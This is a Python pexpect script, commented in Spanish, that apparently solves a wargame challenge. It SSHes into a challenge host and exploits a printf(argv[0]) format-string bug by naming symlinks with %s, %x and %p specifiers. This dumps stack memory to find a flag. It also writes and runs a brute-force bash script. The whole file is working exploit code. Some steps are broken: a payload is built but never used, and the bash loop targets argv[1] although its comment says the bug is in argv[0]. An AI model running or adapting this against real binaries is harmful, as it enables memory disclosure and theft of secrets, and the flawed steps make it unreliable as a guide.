#!/usr/bin/env python3

import pexpect

print("💀💀💀 FORMAT STRING EXPLOIT 💀💀💀")

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", encoding='utf-8', timeout=30)

# Login
child.expect(['password:', 'Password:'])
child.sendline("basic9")
child.expect(['\\$'])
print("[✓] Conectado!")

print("\n[*] El bug está en printf(argv[0])")
print("[*] El programa lee la flag en memoria y luego hace printf(argv[0])")
print("[*] Podemos crear un symlink con format string en el nombre!")

# Crear symlinks con format strings para leer memoria
print("\n[*] Creando symlinks con format strings...")

# Primero, limpiar /tmp
child.sendline("cd /tmp && rm -f basic9_* 2>/dev/null")
child.expect(['\\$'])

# Probar diferentes posiciones en el stack
for i in range(1, 50):
    print(f"\n[*] Probando posición {i}...")
    
    # Crear symlink con format string
    symlink_name = f"basic9_%{i}$s"
    child.sendline(f"ln -sf /home/basic9/basic9 '{symlink_name}'")
    child.expect(['\\$'])
    
    # Ejecutar con argumento para triggear el printf bug
    child.sendline(f"./'{symlink_name}' test 2>&1")
    index = child.expect(['\\$', 'Segmentation', 'flag', 'W3C', pexpect.TIMEOUT], timeout=2)
    
    output = child.before
    
    if index == 1:  # Segfault
        print(f"[*] Segfault en posición {i}")
    elif index in [2, 3]:  # flag o W3C encontrado
        print(f"\n🔥🔥🔥 FLAG ENCONTRADA EN POSICIÓN {i} 🔥🔥🔥")
        print(f"Output: {output}")
        
        # Buscar el patrón exacto
        import re
        if "W3C{" in output:
            match = re.search(r'W3C{[^}]+}', output)
            if match:
                print(f"\nFLAG: {match.group(0)}")
                break
    elif output and len(output) > 5:
        # Ver si hay algo interesante
        if not "Bad usage" in output and not "command not found" in output:
            print(f"[*] Output en posición {i}: {output[:100]}")

# Probar con %x para ver valores hexadecimales
print("\n[*] Dumpeando stack con %x...")
for i in range(1, 20):
    symlink_name = f"basic9_%{i}$x"
    child.sendline(f"ln -sf /home/basic9/basic9 '{symlink_name}' 2>/dev/null")
    child.expect(['\\$'])
    
    child.sendline(f"./'{symlink_name}' test 2>&1")
    child.expect(['\\$'], timeout=2)
    output = child.before
    
    if "Bad usage" in output:
        # Extraer el valor hex
        lines = output.split('\n')
        for line in lines:
            if "basic9_" in line and not "ln -sf" in line:
                print(f"Posición {i}: {line.strip()}")

# Técnica alternativa: usar %p para punteros
print("\n[*] Dumpeando punteros con %p...")
for i in range(1, 20):
    symlink_name = f"basic9_%{i}$p"
    child.sendline(f"ln -sf /home/basic9/basic9 '{symlink_name}' 2>/dev/null")
    child.expect(['\\$'])
    
    child.sendline(f"./'{symlink_name}' test 2>&1")
    child.expect(['\\$'], timeout=2)

# Ahora probar direcciones directas
print("\n[*] Probando direcciones directas...")

# La variable password está en el BSS, intentar leerla directamente
addresses = [
    0x0804a040,  # Dirección típica BSS
    0x0804a060,
    0x0804a080,
    0x0804a0a0,
    0x0804a0c0,
    0x0804a100,
]

for addr in addresses:
    # Crear payload con dirección
    symlink_name = f"basic9_\\x{addr:08x}_%8$s"
    print(f"[*] Probando dirección {hex(addr)}...")
    
    child.sendline(f"ln -sf /home/basic9/basic9 test_{addr:x}")
    child.expect(['\\$'])
    
    child.sendline(f"./test_{addr:x} test 2>&1")
    child.expect(['\\$'], timeout=2)
    output = child.before
    
    if "W3C" in output:
        print(f"[!] FLAG en {hex(addr)}: {output}")

# TÉCNICA FINAL: Usar el bug directamente
print("\n[*] Explotación directa del format string...")

# El programa lee la flag en password[] y luego hace printf(argv[0])
# Si pasamos format strings en argv[0], podemos leer la memoria

# Crear un script que explote el bug
exploit_script = """#!/bin/bash
cd /tmp
for i in {1..100}; do
    ln -sf /home/basic9/basic9 "test_$i" 2>/dev/null
    echo "Testing position $i:"
    ./"test_$i" "%$i\$s" 2>&1 | grep -v "Bad usage" | grep -v "You must" | head -5
done
"""

child.sendline(f"cat > /tmp/exploit.sh << 'EOF'\n{exploit_script}\nEOF")
child.expect(['\\$'])

child.sendline("chmod +x /tmp/exploit.sh")
child.expect(['\\$'])

child.sendline("/tmp/exploit.sh 2>&1 | grep -E 'W3C|flag' | head -5")
child.expect(['\\$'], timeout=10)
output = child.before

if "W3C" in output:
    print(f"\n🔥🔥🔥 FLAG ENCONTRADA 🔥🔥🔥")
    print(output)

child.close()
print("\n💀💀💀 FIN 💀💀💀")